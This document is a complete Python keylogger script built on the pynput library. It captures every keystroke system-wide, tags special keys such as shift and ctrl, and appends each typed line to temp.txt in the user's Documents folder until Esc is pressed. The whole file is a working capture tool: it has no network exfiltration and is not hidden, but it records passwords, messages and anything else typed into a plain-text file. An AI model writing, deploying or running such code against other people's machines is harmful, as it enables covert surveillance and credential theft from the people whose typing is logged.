import pynput
from pynput import keyboard
from pynput.keyboard import Key
import os

sentence = ""
document_path = None
temp_file = None
pressed_special_keys = set()

def file_checker():
    global document_path
    global temp_file
    document_path = os.path.expanduser("~\\Documents")
    temp_file = os.path.join(document_path, "temp.txt") 

    if os.path.exists(temp_file):
        print(f"Found existing file, writing to {temp_file}")
    else:
        with open(temp_file, "w") as f:  
            print(f"Creating a file at {temp_file}")

def write_to_file(text):
    global temp_file
    if temp_file:
        try:
            with open(temp_file, "a") as f:
                f.write(text + "\n")
        except Exception as e:
            print(f"Error writing to file: {e}")
    else:
        print("Temporary file path is not set.")

def Press(key):
    global sentence
    global pressed_special_keys

    try:
        sentence += key.char
        print(key.char)

    except AttributeError:
        if key == keyboard.Key.space:
            sentence += " "
        elif key == keyboard.Key.enter:
            print(f"Sentence: {sentence}")
            write_to_file(sentence)
            sentence = ""
        elif key == keyboard.Key.backspace:
            sentence = sentence[:-1]
        
        
        else:
            special_key_name = str(key).replace('Key.', '')
            sentence += f"<{special_key_name}_Press>"
            pressed_special_keys.add(key)
        


def Release(key):
    global sentence 
    global pressed_special_keys

    if key in pressed_special_keys:
        special_key_name = str(key).replace('Key.', '')
        sentence += f"<{special_key_name}_Release>"
        pressed_special_keys.remove(key)

    if key == keyboard.Key.esc:
        print("shutting")
        return False

if __name__ == "__main__":
    file_checker()  
    with keyboard.Listener(on_press=Press, on_release=Release) as listener:
        listener.join()